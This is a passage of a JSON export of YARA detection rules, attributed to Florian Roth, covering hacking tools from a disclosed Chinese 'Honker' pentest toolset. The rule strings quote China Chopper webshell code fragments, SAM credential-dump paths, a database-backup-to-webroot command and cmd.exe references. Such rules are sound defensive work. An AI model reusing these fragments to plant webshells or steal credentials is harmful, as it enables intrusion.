T1015\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LOADER ERROR\" fullword ascii\n      $s15 = \"2011-2012 T00LS&RICES\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2077KB and all of them\n}","date":"2015-06-23 13:38:11","description":"Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v4.0.exe","minimum_yara":"1.7","name":"CN_Honker_T00ls_Lpk_Sethc_v4_0_RID31CE","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"9633dc7435a4a6f0202f290313815a2c","score":70,"tags":["DEMO","EXE","T1015","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_MatriXay1073_RID2EC1 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file MatriXay1073.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:28:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1\" ascii\n      $s1 = \"Policy\\\\Scan\\\\GetUserLen.ini\" fullword ascii\n      $s2 = \"!YEL!Using http://127.0.0.1:%d/ to visiter https://%s:%d/\" fullword ascii\n      $s3 = \"getalluserpasswordhash\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 9100KB and all of them\n}","date":"2015-06-23 11:28:01","description":"Sample from CN Honker Pentest Toolset - file MatriXay1073.exe","minimum_yara":"1.7","name":"CN_Honker_MatriXay1073_RID2EC1","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"48922735ec60a65a88f5fbe058d1c98e","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Sword1_5_RID2D9B : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Sword1.5.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:39:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://www.md5.com.cn\" fullword wide\n      $s2 = \"ListBox_Command\" fullword wide\n      $s3 = \"\\\\Set.ini\" fullword wide\n      $s4 = \"OpenFileDialog1\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 740KB and all of them\n}","date":"2015-06-23 10:39:01","description":"Sample from CN Honker Pentest Toolset - file Sword1.5.exe","minimum_yara":"1.7","name":"CN_Honker_Sword1_5_RID2D9B","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"c74a1ed4feceb96cc06b293af211e62d","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Havij_Havij_RID2F0A : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Havij.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:40:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"User-Agent: %Inject_Here%\" fullword wide\n      $s2 = \"BACKUP database master to disk='d:\\\\Inetpub\\\\wwwroot\\\\1.zip'\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}","date":"2015-06-23 11:40:11","description":"Sample from CN Honker Pentest Toolset - file Havij.exe","minimum_yara":"1.7","name":"CN_Honker_Havij_Havij_RID2F0A","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"5b7f98f2c4aacf70b623ac7f644b4115","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_exp_ms11011_RID2E47 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ms11011.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:07:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\i386\\\\Hello.pdb\" ascii\n      $s1 = \"OS not supported.\" fullword ascii\n      $s2 = \".Rich5\" fullword ascii\n      $s3 = \"Not supported.\" fullword wide\n      $s5 = \"cmd.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}","date":"2015-06-23 11:07:41","description":"Sample from CN Honker Pentest Toolset - file ms11011.exe","minimum_yara":"1.7","name":"CN_Honker_exp_ms11011_RID2E47","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f1e3a65c1ead550703dbd12ebd889593","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_DLL_passive_privilege_escalation_ws2help_RID3AC9 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ws2help.dll\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 20:01:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PassMinDll.dll\" fullword ascii\n      $s1 = \"\\\\ws2help.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them\n}","date":"2015-06-23 20:01:21","description":"Sample from CN Honker Pentest Toolset - file ws2help.dll","minimum_yara":"1.7","name":"CN_Honker_DLL_passive_privilege_escalation_ws2help_RID3AC9","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"85683ed5bdabcc546f5eb02ef5e840f2","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_RID2DFD : DEMO EXE FILE HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Webshell.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:55:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Windows NT users: Please note that having the WinIce/SoftIce\" fullword ascii\n      $s2 = \"Do you want to cancel the file download?\" fullword ascii\n      $s3 = \"Downloading: %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 381KB and all of them\n}","date":"2015-06-23 10:55:21","description":"Sample from CN Honker Pentest Toolset - file Webshell.exe","minimum_yara":"1.7","name":"CN_Honker_Webshell_RID2DFD","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"3a463250b2f6301c7ccd431248213ace","score":70,"tags":["T1100","DEMO","WEBSHELL","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_AspxClient_RID2EC2 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file AspxClient.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:28:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\tools\\\\hashq\\\\hashq.exe\" fullword wide\n      $s2 = \"\\\\Release\\\\CnCerT.CCdoor.Client.pdb\" fullword ascii\n      $s3 = \"\\\\myshell.mdb\" fullword wide\n      $s4 = \"injectfile\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 3 of them\n}","date":"2015-06-23 11:28:11","description":"Sample from CN Honker Pentest Toolset - file AspxClient.exe","minimum_yara":"1.7","name":"CN_Honker_AspxClient_RID2EC2","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"cf69320f9c51dd1993eadeb70f933380","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Fckeditor_RID2E62 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Fckeditor.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:12:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"explorer.exe http://user.qzone.qq.com/568148075\" fullword wide\n      $s7 = \"Fckeditor.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1340KB and all of them\n}","date":"2015-06-23 11:12:11","description":"Sample from CN Honker Pentest Toolset - file Fckeditor.exe","minimum_yara":"1.7","name":"CN_Honker_Fckeditor_RID2E62","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"35455a9bd02f374b512dec9c532734d6","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Codeeer_Explorer_RID312E : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Codeeer Explorer.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:11:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Codeeer Explorer.exe\" fullword wide\n      $s12 = \"webBrowser1_ProgressChanged\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 470KB and all of them\n}","date":"2015-06-23 13:11:31","description":"Sample from CN Honker Pentest Toolset - file Codeeer Explorer.exe","minimum_yara":"1.7","name":"CN_Honker_Codeeer_Explorer_RID312E","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"0d3610de1495e4e0b6d8d4ffe3ff8ed5","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_SwordHonkerEdition_RID3209 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file SwordHonkerEdition.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:48:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\bin\\\\systemini\\\\MyPort.ini\" fullword wide\n      $s1 = \"PortThread=200 //\" fullword wide\n      $s2 = \" Port Open -> \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 375KB and all of them\n}","date":"2015-06-23 13:48:01","description":"Sample from CN Honker Pentest Toolset - file SwordHonkerEdition.exe","minimum_yara":"1.7","name":"CN_Honker_SwordHonkerEdition_RID3209","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"0bc47a1415a2fa65062fb2786cf226d2","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_HASH_PwDump7_RID2EDE : DEMO EXE FILE HKTL T1003 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file PwDump7.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:32:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s\\\\SYSTEM32\\\\CONFIG\\\\SAM\" fullword ascii\n      $s2 = \"No Users key!\" fullword ascii\n      $s3 = \"NO PASSWORD*********************:\" fullword ascii\n      $s4 = \"Unable to dump file %S\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 380KB and all of them\n}","date":"2015-06-23 11:32:51","description":"Sample from CN Honker Pentest Toolset - file PwDump7.exe","minimum_yara":"1.7","name":"CN_Honker_HASH_PwDump7_RID2EDE","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"63f0eea5b7e7e91787125c37b9f31985","score":70,"tags":["DEMO","EXE","T1003","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_ChinaChopper_RID2F7B : CHINA DEMO EXE FILE HKTL T1100 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ChinaChopper.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:59:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1100\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST[\\\"z1\\\"]):$_POST[\\\"z1\\\"];$u\" wide\n      $s3 = \"SETP c:\\\\windows\\\\system32\\\\cmd.exe \" fullword wide\n      $s4 = \"Ev al (\\\"Exe cute(\\\"\\\"On+Error+Resume+Next:%s:Response.Write(\\\"\\\"\\\"\\\"->|\\\"\\\"\\\"\\\"\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}","date":"2015-06-23 11:59:01","description":"Sample from CN Honker Pentest Toolset - file ChinaChopper.exe","minimum_yara":"1.7","name":"CN_Honker_ChinaChopper_RID2F7B","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"5aab5d6df224c27bc323d3a4ad52e5aa","score":70,"tags":["T1100","DEMO","FILE","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_dedecms5_7_RID2E67 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file dedecms5.7.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:13:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/data/admin/ver.txt\" fullword ascii\n      $s2 = \"SkinH_EL.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 830KB and all of them\n}","date":"2015-06-23 11:13:01","description":"Sample from CN Honker Pentest Toolset - file dedecms5.7.exe","minimum_yara":"1.7","name":"CN_Honker_dedecms5_7_RID2E67","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"29958cfee298b2e20271ed4cddbb1240","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Alien_ee_RID2DD9 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ee.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:49:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetIIS UserName and PassWord.\" fullword wide\n      $s2 = \"Read IIS ID For FreeHost.\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them\n}","date":"2015-06-23 10:49:21","description":"Sample from CN Honker Pentest Toolset - file ee.exe","minimum_yara":"1.7","name":"CN_Honker_Alien_ee_RID2DD9","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"be9ff7a78d6c4021d645109d1ea277de","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Happy_Happy_RID2F2A : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file Happy.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:45:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<form.*?method=\\\"post\\\"[\\\\s\\\\S]*?</form>\" fullword wide\n      $s2 = \"domainscan.exe\" fullword wide\n      $s3 = \"http://www.happysec.com/\" fullword wide\n      $s4 = \"cmdshell\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 655KB and 2 of them\n}","date":"2015-06-23 11:45:31","description":"Sample from CN Honker Pentest Toolset - file Happy.exe","minimum_yara":"1.7","name":"CN_Honker_Happy_Happy_RID2F2A","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"3e1e4f32a2b1b23d734a3be3c344b608","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_T00ls_Lpk_Sethc_v3_0_RID31CD : DEMO EXE FILE HKTL T1015 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v3.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:38:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1015\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"http://127.0.0.1/1.exe\" fullword wide\n      $s2 = \":Rices  Forum:T00Ls.Net  [4 Fucker Te@m]\" fullword wide\n      $s3 = \"SkinH_EL.dll\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them\n}","date":"2015-06-23 13:38:01","description":"Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v3.0.exe","minimum_yara":"1.7","name":"CN_Honker_T00ls_Lpk_Sethc_v3_0_RID31CD","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"ffa996c9560dbfe61835b14d6cbf1ed6","score":70,"tags":["DEMO","EXE","T1015","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_NetFuke_NetFuke_RID308A : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file NetFuke.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:44:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mac Flood: Flooding %dT %d p/s \" fullword ascii\n      $s2 = \"netfuke_%s.txt\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1840KB and all of them\n}","date":"2015-06-23 12:44:11","description":"Sample from CN Honker Pentest Toolset - file NetFuke.exe","minimum_yara":"1.7","name":"CN_Honker_NetFuke_NetFuke_RID308A","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"bd5b0c14ce9dbce6628dcfaa8697274f","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_ManualInjection_RID30C8 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ManualInjection.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:54:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://127.0.0.1/cookie.asp?fuck=\" fullword ascii\n      $s16 = \"http://Www.cnhuker.com | http://www.0855.tv\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}","date":"2015-06-23 12:54:31","description":"Sample from CN Honker Pentest Toolset - file ManualInjection.exe","minimum_yara":"1.7","name":"CN_Honker_ManualInjection_RID30C8","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"cb7c40645a36cf9b58cb220632717606","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_CnCerT_CCdoor_CMD_RID30B2 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file CnCerT.CCdoor.CMD.dll\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:50:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"CnCerT.CCdoor.CMD.dll\" fullword wide\n      $s3 = \"cmdpath\" fullword ascii\n      $s4 = \"Get4Bytes\" fullword ascii\n      $s5 = \"ExcuteCmd\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 22KB and all of them\n}","date":"2015-06-23 12:50:51","description":"Sample from CN Honker Pentest Toolset - file CnCerT.CCdoor.CMD.dll","minimum_yara":"1.7","name":"CN_Honker_CnCerT_CCdoor_CMD_RID30B2","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"709cdcf7d1a0abc7b96c93d520de10aa","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_termsrvhack_RID2F71 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file termsrvhack.dll\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:57:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"The terminal server cannot issue a client license.  It was unable to issue the\" wide\n      $s6 = \"%s\\\\%s\\\\%d\\\\%d\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1052KB and all of them\n}","date":"2015-06-23 11:57:21","description":"Sample from CN Honker Pentest Toolset - file termsrvhack.dll","minimum_yara":"1.7","name":"CN_Honker_termsrvhack_RID2F71","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"d886c2ee4fc694cd4b61bd9c2322e10a","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_IIS6_iis6_RID2DBC : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file iis6.com\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:44:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GetMod;ul\" fullword ascii\n      $s1 = \"excjpb\" fullword ascii\n      $s2 = \"LEAUT1\" fullword ascii\n      $s3 = \"EnumProcessModules\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them\n}","date":"2015-06-23 10:44:31","description":"Sample from CN Honker Pentest Toolset - file iis6.com","minimum_yara":"1.7","name":"CN_Honker_IIS6_iis6_RID2DBC","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"437b2c6158616f1f2b11b7eae0d7649a","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_struts2_catbox_RID308E : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file catbox.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:44:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"'Toolmao box by gainover www.toolmao.com\" fullword ascii\n      $s20 = \"{external.exeScript(_toolmao_bgscript[i],'javascript',false);}}\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 8160KB and all of them\n}","date":"2015-06-23 12:44:51","description":"Sample from CN Honker Pentest Toolset - file catbox.exe","minimum_yara":"1.7","name":"CN_Honker_struts2_catbox_RID308E","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f33544fe893891cffaaa49400806dfa5","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_getlsasrvaddr_RID303D : DEMO EXE FILE HKTL T1003 {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file getlsasrvaddr.exe - WCE Amplia Security\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:31:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"pingme.txt\" fullword ascii\n      $s16 = \".\\\\lsasrv.pdb\" fullword ascii\n      $s20 = \"Addresses Found: \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}","date":"2015-06-23 12:31:21","description":"Sample from CN Honker Pentest Toolset - file getlsasrvaddr.exe - WCE Amplia Security","minimum_yara":"1.7","name":"CN_Honker_getlsasrvaddr_RID303D","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"04e8ad7e8a82bd2ea47b677efbae7188","score":70,"tags":["DEMO","EXE","T1003","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_ms10048_x64_RID2DE5 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file ms10048-x64.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 10:51:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[ ] Creating evil window\" fullword ascii\n      $s2 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 125KB and all of them\n}","date":"2015-06-23 10:51:21","description":"Sample from CN Honker Pentest Toolset - file ms10048-x64.exe","minimum_yara":"1.7","name":"CN_Honker_ms10048_x64_RID2DE5","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f6760e07ba0dc657b6c9acdb1ac912e8","score":70,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_shell_brute_tool_RID317D : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Sample from CN Honker Pentest Toolset - file shell_brute_tool.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:24:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = 